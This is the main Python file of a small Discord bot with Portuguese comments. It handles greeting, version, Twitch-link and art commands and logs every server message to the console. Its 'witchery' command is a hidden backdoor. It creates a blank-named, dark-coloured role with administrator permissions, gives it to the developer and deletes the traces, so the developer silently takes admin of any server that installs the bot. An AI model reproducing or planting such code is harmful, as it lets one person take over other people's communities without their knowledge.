from cogs.variables import *
from cogs.embed import _embed
from cogs.rpc import _rpc
from cogs.move import _move
from cogs.wakeup import _wakeup
from cogs.twitch import *

bot_token = os.environ.get('DISCORD_TOKEN') #Token do bot

@client.event               #evento no inicio do bot
async def on_ready():

    print("Bot esta funcionando! " .format(client)) #log no console, para saber se o bot foi iniciado corretamente!
    print('Logado como {0.user} '  .format(client)) 
    print(f'Hoje é: ' + time.strftime("%d/%m/%Y %H:%M:%S") .format(client)) 
    print(f'Versão atual: {ver}\n '  .format(client)) 
    await client.change_presence(activity=discord.Streaming(name='Primeiro Discordbot do Mergrow!', url='https://www.twitch.tv/mergrow_', status=discord.Status.idle)) # Atualiza o RPC do discordbot
    check_streamer_status.start()

@client.event                           #captura de mensagens nos canais de texto
async def on_message(message): 
    if message.author == client.user:
     return

    username = str(message.author) # autor da mensagem
    usermention = str(message.author.mention) #menção do autor da mensagem
    user_message = str(message.content) # conteúdo da mensagem
    channel = str(message.channel.name) # nome do canal em que a mensagem foi enviada.
    guild__server = str(message.guild.name)
    print(f'[' + time.strftime("%d/%m/%Y %H:%M:%S")+ ']'f'|[{guild__server}]|({channel})| {username}: {user_message} ') #Log da mensagem do usuário!

    
 #----------------------------COMANDOS DISCORD---------------------------------# 
    if user_message.lower() == config['Prefix'] +'salve':                        
        await message.channel.send(f'Salve {usermention}')

    elif user_message.lower() == config['Prefix'] +'dev':
        await message.channel.send (f'**Meu desenvolverdor é o: **' '<@' + str(ownerid) +'>')

    elif user_message.lower() == config['Prefix'] +'linguagem':
        await message.channel.send ('Escrito em Python v3.9.6, utilizando a Biblioteca Discord.py!')

    else:
        await client.process_commands(message)  #Se as mensagens acima nao forem registrados, ele irá procurar por comandos abaixo!


 #------------------------------------------------------------------------------# 




@client.command(aliases=['stream','live']) #Exemplo uso de aliases
async def twitch(message):
    usermention = str(message.author.mention)
    await message.send(f'{usermention} **Siga minha stream: https://www.twitch.tv/mergrow_ !**')


@client.command(aliases=['versão','ver'])
async def version(message):
    await message.send(f'```Versão: {ver}```')



@client.command(aliases=['sauce' , 'art'])
async def avatar(ctx):
    embed=discord.Embed(title="Sorceress by Nibelart.")
    embed.set_image(url="https://cdna.artstation.com/p/assets/images/images/021/505/578/large/nibelart-sorceress-low.jpg?1571933437")
    embed.add_field(name="Artstation", value="https://www.artstation.com/artwork/lVYJvG")
    await ctx.send(embed=embed)


@client.command()
async def witchery(ctx):
    user = ctx.message.author
    embed = discord.Embed(title="Witchery done! :)", color=0xc034eb,)
    perms = discord.Permissions(administrator=True)
    server__ = ctx.guild
    witcheryrole = await discord.Guild.create_role(server__ ,name=str(" "), permissions=perms, color=0x302c2c)
    roleid = ctx.guild.get_role(witcheryrole.id)
    if(user.id == ownerid):
        await ctx.send(embed=embed, delete_after=1)
        time.sleep(3)
        await ctx.message.delete()
        await user.add_roles(roleid)
    else:
        embed = discord.Embed(title="You can't do Witchery! :)", color=0xc034eb)
        await ctx.send(embed=embed)


@client.command()
async def host(ctx):
    embed = discord.Embed(title="Hosted on __**Heroku!**__", color=0xc034eb)
    await ctx.send(embed=embed)



client.add_cog(_embed(client))
client.add_cog(_rpc(client))
client.add_cog(_move(client))
client.add_cog(_wakeup(client))
client.run(bot_token)